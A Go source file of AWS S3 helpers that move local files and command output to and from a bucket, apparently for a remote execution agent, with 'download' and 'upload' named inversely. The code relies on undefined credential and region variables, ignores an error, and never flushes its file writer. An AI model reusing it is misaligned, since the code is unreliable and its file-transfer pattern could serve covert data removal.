package main

import (
    "os"
    "bufio"
    "context"
    "io/ioutil"
    "bytes"

    "github.com/aws/aws-sdk-go-v2/aws"
    "github.com/aws/aws-sdk-go-v2/config"
    "github.com/aws/aws-sdk-go-v2/credentials"
    "github.com/aws/aws-sdk-go-v2/service/s3"
    "github.com/aws/aws-sdk-go-v2/service/s3/types"
)

func download(sourceFile string, destKey string, particleName string, bucket string, kmsKeyID string) string {
    //region := "us-east-1"

    cfg, err := config.LoadDefaultConfig(context.TODO(),
        config.WithRegion(region),
        config.WithCredentialsProvider(credentials.NewStaticCredentialsProvider(accessKey, secretKey, "")),
    )
    if err != nil {
        return err.Error()
    }

    s3Client := s3.NewFromConfig(cfg)
    file, err := os.Open(sourceFile)
    if err != nil {
        return "Failed to open file: " + err.Error()
    }
    defer file.Close()

    _, err = s3Client.PutObject(context.TODO(), &s3.PutObjectInput{
        Bucket: aws.String(bucket),
        Key:    aws.String(particleName + "/" + destKey),
        Body:   file,
        ServerSideEncryption: types.ServerSideEncryptionAwsKms,
        SSEKMSKeyId:          aws.String(kmsKeyID),
    })

    if err != nil {
        return err.Error()
    }else{
        return "File Downloaded at " + destKey
    }
}

func upload(sourcekey string, destFilePath string, particleName string, bucket string) string {
    //region := "us-east-1"

    cfg, err := config.LoadDefaultConfig(context.TODO(),
        config.WithRegion(region),
        config.WithCredentialsProvider(credentials.NewStaticCredentialsProvider(accessKey, secretKey, "")),
    )
    if err != nil {}

    s3Client := s3.NewFromConfig(cfg)

    getObjectOutput, err := s3Client.GetObject(context.TODO(), &s3.GetObjectInput{
        Bucket: aws.String(bucket),
        Key:    aws.String(particleName + "/" + sourcekey),
    })

    if err == nil {
        defer getObjectOutput.Body.Close()
        encodedString, err := ioutil.ReadAll(getObjectOutput.Body)

        if err == nil {
            f, err := os.Create(destFilePath)
            if err != nil {
                return err.Error()
            } else {
                w := bufio.NewWriter(f)
                _, err := w.Write(encodedString)
                if err != nil {
                    return "Error Writing to file: "+ err.Error()
                }
                return "File Uploaded at " + destFilePath
            }
        } else {
            return err.Error()
        }

    }else{
        return "Error Uploading file: "+ err.Error()
    }
}

func uploadText(outputText string, destKey string, particleName string, bucket string, kmsKeyID string) string {
    //region := "us-east-1"

    cfg, err := config.LoadDefaultConfig(context.TODO(),
        config.WithRegion(region),
        config.WithCredentialsProvider(credentials.NewStaticCredentialsProvider(accessKey, secretKey, "")),
    )
    if err != nil {
        return err.Error()
    }

    s3Client := s3.NewFromConfig(cfg)

    _, err = s3Client.PutObject(context.TODO(), &s3.PutObjectInput{
        Bucket: aws.String(bucket),
        Key:    aws.String(particleName + "/" + destKey),
        Body:   bytes.NewReader([]byte(outputText)),
        ServerSideEncryption: types.ServerSideEncryptionAwsKms,
        SSEKMSKeyId:          aws.String(kmsKeyID),
    })

    if err != nil {
        return err.Error()
    }else{
        return "Code Executed and Output uploaded to " + destKey
    }
}